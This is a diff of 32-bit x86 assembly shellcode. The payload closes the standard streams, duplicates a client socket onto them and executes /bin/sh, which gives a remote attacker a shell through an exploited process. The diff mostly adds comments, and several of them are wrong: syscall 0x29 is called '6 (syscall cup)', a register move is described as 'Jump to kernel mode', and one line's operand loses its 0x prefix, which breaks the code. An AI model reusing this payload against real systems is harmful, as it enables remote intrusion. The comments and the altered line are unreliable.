@@ -9,46 +9,49 @@ function:
 
 	#PAYLOAD_START
 
-	jmp L1				# Jumping to L1
+	jmp 	L1			# Jumping to L1
 	L2: 				
 
-	xorl %eax, %eax			# Setting eax to 0
-	xorl %ebx, %ebx
+	xorl 	%eax, %eax		# Set %eax to 0
+	xorl	%ebx, %ebx		# Set %ebx to 0
 
-	#closing stdin
-	movb %al, %bl
-	movb $0x6, %al			# Setting eax to 6 (close)
-	int $0x80
+					# Closing stdin
 
-	#closing stdout
-	movb $0x1, %bl
-	movb $0x6, %al
-	int $0x80
+	movb	%al, %bl		# Set %eax lowest byte to 6 (syscall close)
+	movb	$0x6, %al		# Jump to kernel mode
+	int	$0x80
 
-	#closing stderr
-	movb $0x2, %bl	
-	movb $0x6, %al
-	int $0x80
+					# Closing stdout
 
-	#duplicating socket
+	movb	$0x1, %bl		# Set %ebx lowest byte to 1
+	movb	$0x6, %al		# Set %eax lowest byte to 6 (syscall close)
+	int	$0x80			# Jump to kernel mode
 
-	movb $0x3, %bl			# setting dup arg to socket
-	movb $0x29, %al
-	int $0x80	
+					# Closing stderr
 
-	movb $0x29, %al	
-	int $0x80
+	movb 	$0x2, %bl		# Set %ebx lowest byte to 1
+	movb 	$0x6, %al		# Set %eax lowest byte to 6 (syscall close)
+	int 	$0x80			# Jump to kernel mode
 
-	movb $0x29, %al	
-	int $0x80
+					# Duplicating socket
 
-	# Writing "/bin/sh" to the standard ouput
+	movb	$0x3, %bl		# Set %ebx lowest byte to 3 (will be replaced by client socket in exploit)
+	movb	$0x29, %al		# Set %eax lowest byte to 6 (syscall cup)
+	int	$0x80			# Jump to kernel mode
 
-	popl %esi
-	xorl %eax, %eax
-	movb %al,0x7(%esi)		# NULL terminate /bin/sh
-	push %eax
-	push %esi
+	movb	$0x29, %al		# Set %eax lowest byte to 6 (syscall cup)
+	int	$0x80			# Jump to kernel mode
+
+	movb	$0x29, %al		# Set %eax lowest byte to 6 (syscall cup)
+	int	$0x80			# Jump to kernel mode
+
+					# Call to execve, invoking /bin/sh
+
+	popl 	%esi			# Address of /bin/sh now in %esi
+	xorl 	%eax, %eax		# NULL in %eax
+	movb 	%al, x7(%esi)		# NULL terminate /bin/sh
+	push 	%eax			# NULL after pointer below
+	push 	%esi			# Create pointer to array
 
 	xorl	%edx, %edx		# NULL in %edx
 	movl	%esp, %ecx		# Address of array in %ecx
